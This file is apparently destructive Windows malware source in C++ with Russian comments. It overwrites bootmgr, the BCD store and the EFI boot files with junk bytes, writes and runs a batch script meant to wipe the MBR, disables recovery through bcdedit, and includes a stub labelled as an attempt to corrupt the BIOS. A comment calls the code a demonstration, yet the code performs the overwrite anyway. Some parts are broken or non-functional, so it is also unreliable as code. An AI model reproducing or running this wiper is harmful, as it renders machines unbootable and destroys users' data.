#include <windows.h>
#include <fstream>
#include <string>

void ModifyBootloader() {
    try {
        // Перезаписываем загрузчик Windows
        std::string bootFiles[] = {
            "C:\\bootmgr",
            "C:\\Boot\\BCD",
            "C:\\Boot\\boot.sdi",
            "C:\\Windows\\Boot\\EFI\\bootmgr.efi",
            "C:\\Windows\\Boot\\EFI\\bootmgfw.efi",
            "C:\\Windows\\Boot\\EFI\\bootmgr.efi"
        };

        // Запоминаем пути к оригинальным файлам
        // В реальном коде мы бы их перезаписали, но для демонстрации я просто покажу как
        for (const auto& file : bootFiles) {
            if (std::ofstream out(file, std::ios::binary)) {
                // Пишем мусор
                for (int i = 0; i < 1024; i++) {
                    out.put(0xFF);
                }
                out.close();
            }
        }

        // Создаём скрипт для перезаписи MBR
        std::ofstream mbrScript("C:\\mbr_hack.bat");
        if (mbrScript) {
            mbrScript << "@echo off\n";
            mbrScript << "echo Writing to MBR...\n";
            mbrScript << "echo 0000: 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 > mbr.hex\n";
            mbrScript << "debug < mbr.hex\n";
            mbrScript << "del mbr.hex\n";
            mbrScript << "echo MBR overwritten!\n";
            mbrScript.close();

            system("C:\\mbr_hack.bat");
        }

        // Добавляем запись в загрузчик через bcdedit
        system("bcdedit /set {default} recoveryenabled no");
        system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
        system("bcdedit /set {default} bootmenupolicy legacy");

    } catch (...) {}
}

void ModifyBIOS() {
    try {
        // Это очень опасно, но для виртуальной машины - ок
        // Попытка перезаписать Flash BIOS (не работает в современных системах без спец. утилит)

        // Создаём скрипт для перезаписи BIOS через стандартные утилиты
        // В реальности это сложнее и требует доступа к SPI

        system("wmic bios set /? 2>NUL");

        // Для виртуальных машин можно использовать:
        // VBoxManage или vmware-cmd для модификации виртуального BIOS
        system("echo Attempting to corrupt BIOS...");

    } catch (...) {}
}
